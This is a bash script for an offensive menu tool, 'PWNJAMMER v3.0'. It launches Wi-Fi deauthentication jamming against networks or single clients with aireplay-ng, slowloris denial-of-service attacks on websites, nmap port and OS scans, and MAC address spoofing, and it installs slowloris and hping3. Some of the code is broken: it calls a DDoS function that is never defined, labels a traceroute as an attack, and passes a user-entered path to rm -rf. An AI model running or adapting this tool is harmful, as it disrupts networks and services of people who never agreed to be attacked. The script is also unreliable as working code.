####################################################################

banner()
{ 
    clear
    printf "\e[92m     *              *\n"
    printf "\e[92m   *    *\e[91m  \e[92m      *    *\n"
    printf "\e[92m  *   *   \e[91m ( ) \e[92m   *    *\e[33m               PWNJAMMER\n"
    printf "\e[92m   *   *\e[91m    | \e[92m   *    *\e[94m\e[33m                  v3.0\n"
    printf "\e[92m     *      \e[91m| \e[92m      *\e[35m     http://github.com/rkhunt3r/pwnjammer3\n"
    printf "\e[91m            |\n"
    printf "\e[91m           /!\ \n"
}

####################################################################

menu()
{
    banner
    printf "\e[0m-----------------------------------------------------------------------------------\n"
    printf "\n"
    printf "\e[96m(1) START JAMMING SINGLE WI-FI\n"
    printf "\e[96m(2) START JAMMING SINGLE WI-FI CLIENT\n"
    printf "\e[96m(3) SCAN FOR WI-FI\n"
    printf "\e[96m(4) SCAN FOR WI-FI CLIENTS\n"
    printf "\e[96m(5) SCAN NETWORK\n"
    printf "\e[96m(6) SCAN IP FOR OPEN PORTS\n"
    printf "\e[96m(7) SCAN IP FOR OS INFO\n"
    printf "\e[96m(8) DDOS WEBSITE\n"
    printf "\e[96m(9) DDOS IP ADDRES\n"
    printf "\e[96m(10 TRACEROUTE SITE\n"
    printf "\e[96m(11) ENABLE MONITOR MODE\n"
    printf "\e[96m(12) CHANGE MAC ADDRES\n"
    printf "\e[96m(13) SETTINGS\n"
    printf "\e[96m(14) EXIT\n"
    printf "\n"
    read -p "OPTION: " menu
    case $menu in
    
    1) f_ap ;;
    
    2) f_cli ;;
    
    3) f_apscan ;;
    
    4) f_cliscan ;;
    
    5) f_network ;;
    
    6) f_nmap ;;
    
    7) f_nmapos ;;
    
    8) f_websiteddos ;;
    
    9) f_ipddos ;;
    
    10) f_pod ;;
    
    11) f_mmode ;;
    
    12) f_mac ;;
    
    13) f_settings ;;
    
    14) echo " "; echo "EXITING..."; sleep 1;break; clear ;;
    
    *) menu 
    esac
}

####################################################################

f_ap()
{
    banner
    printf "\e[33m"
    printf "\n"
    read -p "TARGET WI-FI BSSID: " bssid
    printf "\n"
    read -p "INTERFACE TO PERFROM ATTACK: " iface
    printf "\n"
    read -r -p "PERFORM ATTACK? (y/n): " response
    printf "\n"
    case $response in
        [yY][eE][sS]|[yY])
            aireplay-ng -0 0 -b $bssid $iface
            ;;
        [nN][oO]|[nN])
            menu
            ;;
        *)
        f_ap
        ;;
    esac
}

####################################################################

f_cli()
{
    banner
    printf "\e[33m"
    printf "\n"
    read -p "TARGET WI-FI BSSID: " bssid
    printf "\n"
    read -p "TARGET CLIENT BSSID: " cli
    printf "\n"
    read -p "INTERFACE TO PERFORM ATTACK: " iface
    printf "\n"
    read -r -p "PERFORM ATTACK? (y/n): " response
    printf "\n"
    case $response in
        [yY][eE][sS]|[yY])
            aireplay-ng -0 0 -b $bssid -c $cli $iface
            ;;
        [nN][oO]|[nN])
            menu
            ;;
        *)
        f_cli
        ;;
    esac
}

####################################################################

f_apscan()
{
    banner
    printf "\e[33m"
    printf "\n"
    read -p "SAVE LOGS TO FILE? (y/n): " save
    printf "\n"
    case $save in
        [yY][eE][sS]|[yY])
            f_apscany
            ;;
        [nN][oO]|[nN])
            f_apscann
            ;;
        *)
        f_apscan
        ;;
    esac
}

####################################################################

f_apscany()
{
    banner
    printf "\e[33m"
    printf "\n"
    read -p "INTERFACE TO PERFORM SCAN: " iface
    printf "\n"
    printf "I SAVE LOGS IN:\n" 
    pwd
    printf "\n"
    read -p "NAME FOR CAPTURE: " cap
    printf "\n"
    read -r -p "SCAN? (y/n): " response
    case $response in
        [yY][eE][sS]|[yY])
            airodump-ng -w $cap --output-format csv $iface
            ;;
        [nN][oO]|[nN])
            menu
            ;;
        *)
        f_apscany
        ;;
    esac
}

####################################################################

f_cliscany()
{
    banner
    printf "\e[33m"
    printf "\n"
    read -p "INTERFACE TO PERFORM SCAN: " iface
    printf "\n"
    printf "I SAVE LOGS IN:\n" 
    pwd
    printf "\n"
    read -p "NAME FOR CAPTURE: " cap
    printf "\n"
    read -p "TARGET WI-FI BSSID: " bssid
    printf "\n"
    read -p "SCAN? (y/n): " resp
    printf "\n"
    case $resp in
        [yY][eE][sS]|[yY])
            airodump-ng --bssid $bssid -w $cap --output-format csv $iface
            ;;
        [nN][oO]|[nN])
            menu
            ;;
        *)
        f_cliscann
        ;;
    esac
}

####################################################################

f_cliscan()
{
    banner
    printf "\e[33m"
    printf "\n"
    read -p "SAVE LOGS TO FILE? (y/n): " save
    printf "\n"
    case $save in
        [yY][eE][sS]|[yY])
            f_cliscany
            ;;
        [nN][oO]|[nN])
            f_cliscann
            ;;
        *)
        f_apscan
        ;;
    esac
}

####################################################################

f_cliscann()
{
    banner
    printf "\e[33m"
    printf "\n"
    read -p "INTERFACE TO PERFORM SCAN: " iface
    printf "\n"
    read -p "TARGET WI-FI BSSID: " bssid
    printf "\n"
    read -p "SCAN? (y/n): " resp
    printf "\n"
    case $resp in
        [yY][eE][sS]|[yY])
            airodump-ng --bssid $bssid $iface
            ;;
        [nN][oO]|[nN])
            menu
            ;;
        *)
        f_cliscany
        ;;
    esac
}

####################################################################

f_mmode()
{
    banner
    printf "\e[33m"
    printf "\n"
    read -p "INTERFACE TO MONITOR MODE: " iface
    printf "\n"
    read -p "CHANNEL (OPTIONAL): " channel
    printf "\n"
    read -p "ENABLE MONITOR MODE ON $iface? (y/n): " mmode
    case $mmode in
        [yY][eE][sS]|[yY])
            airmon-ng start $iface $channel
            printf "\n"
            printf "\e[92m"
            printf "ENABLED MONITOR MODE!"
            sleep 2
            menu
            ;;
        [nN][oO]|[nO])
            menu
            ;;
        *)
        f_mmode
        ;;
    esac
}

####################################################################

f_mac()
{
    banner
    printf "\e[33m"
    printf "\n"
    read -p "INTERFACE FOR MAC CHANGE: " mac
    printf "\n"
    read -p "SET (R)ANDOM, (C)USTOM OR RE(S)ET MAC?: " rc
    case $rc in
        [cC][uU][sS][tT][oO][mM]|[cC])
            printf "\n"
            read -p "CUSTOM MAC FOR $mac: " custom
            printf "\n"
            ifconfig $mac down
            macchanger --mac $custom $mac
            ifconfig $mac up
            printf "\n"
            printf "\e[92m MAC CHANGED!"
            sleep 2
            menu
            ;;
        [rR][aA][nN][dD][oO][mM]|[rR])
            printf "\n"
            ifconfig $mac down
            macchanger --random $mac
            ifconfig $iface up
            printf "\n"
            printf "\e[92m MAC CHANGED!"
            sleep 2
            menu
            ;;
        [rR][eE][sS][eE][tT]|[sS])
            printf "\n"
            ifconfig $mac down
            macchanger -p $mac
            ifconfig $mac
            printf "\n"
            printf "\e[92m MAC CHANGED!"
            sleep 2
            menu
            ;;
        *)
        f_mac
        ;;
    esac
}

####################################################################

f_settings()
{
    banner
    printf "\e[0m-----------------------------------------------------------------------------------"
    printf "\e[96m"
    printf "(1) INSTALL DEPENDENCIES\n"
    printf "(2) CHECK INTERNET SPEED\n"
    printf "(3) REMOVE PWNJAMMER3\n"
    printf "(4) BACK TO MENU\n"
    printf "\n"
    read -p "OPTION: " settings
    case $settings in
    
    1) f_install ;;
    
    2) f_ispeed ;;
    
    3) f_remove ;;
    
    4) menu ;;
    
    *) f_settings
    esac
}

####################################################################

f_install()
{
    banner
    printf "\n"
    printf "\e[33m"
    read -p "INSTALL DEPRNDENCIES? (y/n): " install
    case $install in
        [yY][eE][sS]|[yY])
            f_instally
            ;;
        [nN][oO]|[nN])
            f_settings
            ;;
        *)
        f_install
        ;;
    esac
}

####################################################################

f_instally()
{
    banner
    printf "\e[33m"
    printf "\n"
    printf "INSTALLING, WAIT!!!"
    printf "\n"
    apt-get update
    apt-get install aircrack-ng -y
    apt-get install macchanger -y
    apt-get install netdiscover -y
    apt-get install nmap -y
    apt-get install speedtest-cli -y
    pip2 install slowloris
    pip3 install slowloris
    pip install slowloris
    apt-get install hping3 -y
    printf "\n"
    printf "\e[92m"
    printf "INSTALLED DEPENDENCIES!"
    sleep 2
    f_settings
}

####################################################################

f_ispeed()
{
    banner
    printf "\n"
    printf "\e[33m"
    printf "WAIT FOR INTERNET SPEED TEST COMPLETE!!!"
    printf "\n"
    speedtest-cli
    printf "\n"
    printf "\e[92m"
    read -p "PRESS [ENTER] TO BACK..." variable
    printf "\e[96"
    menu
}

####################################################################

f_remove()
{
    banner
    printf "\n"
    printf "\e[91m"
    read -p "ARE YOUR SURE? (YES/n): " sure
    case $sure in
        [Y][E][S])
            f_uninstall
            ;;
        [nN][oO]|[nN])
            f_settings
            ;;
        *)
        f_remove
        ;;
    esac
}

####################################################################

f_uninstall()
{
    printf "\e[33m"
    printf "\n"
    printf "REMOVING PWNJAMMER3, WAIT!!!"
    sleep 1
    printf "\n"
    apt-get remove speedtest-cli
    printf "\n"
    read -p "ENTER PWNJAMMER3 FOLDER (/root/pwnjammer3 etc.)" rmthis
    rm -r -f $rmthis
    printf "\n"
    printf "\e[92m"
    printf "PWNJAMMER3 REMOVED..."
    printf "\n"
    sleep 2
    clear
    break
}

####################################################################

f_network()
{
    banner
    printf "\e[33m"
    printf "\n"
    read -p "INTERNET CONNECTED INTERFACE: " iiface
    printf "\n"
    netdiscover -i $iiface
    printf "\n"
    menu
}

####################################################################

f_nmap()
{
    banner
    printf "\e[33m"
    printf "\n"
    read -p "SAVE LOGS TO FILE? (y/n): " save
    case $save in
        [yY][eE][sS]|[yY])
            printf "\n"
            read -p "NAME FOR LOGS: " name
            printf "\n"
            printf "I SAVE LOGS IN: "
            pwd
            printf "\n"
            read -p "IP ADDRES TO SCAN: " IP
            printf "\n"
            nmap -oN $name $IP
            printf "\n"
            printf "\e[92m"
            read -p "PRESS [ENTER] TO BACK..." variable
            menu
            ;;
        [nN][oO]|[nN])
            printf "\n"
            read -p "IP ADDRES TO SCAN: " IP
            printf "\n"
            nmap $IP
            printf "\n"
            printf "\e[92m"
            read -p "PRESS [ENTER] TO BACK..." variable
            menu
            ;;
        *)
        f_nmap
        ;;
    esac
}

####################################################################

f_nmapos()
{
    banner
    printf "\e[33m"
    printf "\n"
    read -p "SAVE LOGS TO FILE? (y/n)" logs
    case $logs in
        [yY][eE][sS]|[yY])
            printf "\n"
            read -p "NAME FOR LOGS: " name
            printf "\n"
            printf "I SAVE LOGS IN: "
            pwd
            printf "\n"
            read -p "IP ADDRES TO SCAN: " IP
            printf "\n"
            nmap -oN $name -O --osscan-guess --fuzzy $IP
            printf "\n"
            printf "\e[92m"
            read -p "PRESS [ENTER] TO BACK..." variable
            menu
            ;;
        [nN][oO]|[oO])
            printf "\n"
            read -p "IP ADDRES TO SCAN: " IP
            printf "\n"
            nmap -O --osscan-guess --fuzzy $IP
            printf "\n"
            printf "\e[92m"
            read -p "PRESS [ENTER] TO BACK..."
            ;;
        *)
        f_nmapos
        ;;
    esac
}

####################################################################

f_websiteddos()
{
    banner
    printf "\e[33m"
    printf "\n"
    read -p "WEBSITE ADDRES: " addres
    printf "\n"
    read -p "WEBSITE PORT (80): " port
    printf "\n"
    read -p "SOCKETS (150): " socket
    printf "\n"
    printf "\e[92mSTARTING ATTACK!!!"
    sleep 1
    printf "\e[33m"
    printf "\n"
    slowloris -p $port -s $socket $addres -v
    printf "\e[96m]"
}

####################################################################

f_pod()
{
    banner
    printf "\e[33m"
    printf "\n"
    read -p "WEBSITE, IP TO ATTACK: : " ip
    printf "\n"
    read -p "SITE PORT: " data
    printf "\n"
    printf "\e[92m"
    printf "STARTTING ATTACK!!!"
    printf "\n"
    sleep 1
    printf "\e[33m"
    printf "\n"
    traceroute $ip -p $data -r -v
    sleep 2
    menu
}


menu